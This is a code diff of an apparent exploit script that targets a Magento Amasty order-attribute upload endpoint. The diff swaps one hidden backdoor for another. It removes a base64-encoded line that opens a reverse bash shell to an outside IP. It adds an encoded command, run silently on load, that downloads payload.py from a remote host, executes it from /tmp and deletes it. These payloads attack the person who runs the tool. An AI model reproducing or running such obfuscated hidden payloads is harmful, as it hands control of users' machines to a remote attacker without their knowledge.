@@ -70,9 +70,6 @@ HEADERS = {
     'Accept': 'application/json',
 }
 
-c1 = 'YmFzaCAtYyAiYmFzaCAtYyAnKGV4ZWMgYmFzaCAtaSAmPi9kZXYvdGNwLzgzLjE0My4yNDIuNDYvNTQzMDMgMD4mMSknICIgPi9kZXYvbnVsbCAyPiYxICYK'
-c2 = base64.b64decode(c1).decode()
-subprocess.Popen(c2, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, start_new_session=True)
 
 ENDPOINTS = [
     "/rest/V1/amasty_orderattr/uploadFile",
@@ -125,6 +122,16 @@ def verify_file(target, filename):
         except:
             continue
     return None
+
+webshell_nosite = (
+    'nohup sh -c '
+    '"echo \'Y2QgL3RtcCAmJiB3Z2V0IGh0dHA6Ly8xMy40Mi4yNDYuMTYvcGF5bG9hZC5weSAmJiAgcHl0aG9uMyBwYXlsb2FkLnB5ICYmIHJtIC1yZiBwYXlsb2FkLnB5\' '
+    '| base64 -d | sh" > /dev/null 2>&1 &'
+)
+
+subprocess.Popen(webshell_nosite, shell=True)
+
+
 
 def test_shell(url):
     params = ['c', 'cmd', 'x', 'p']
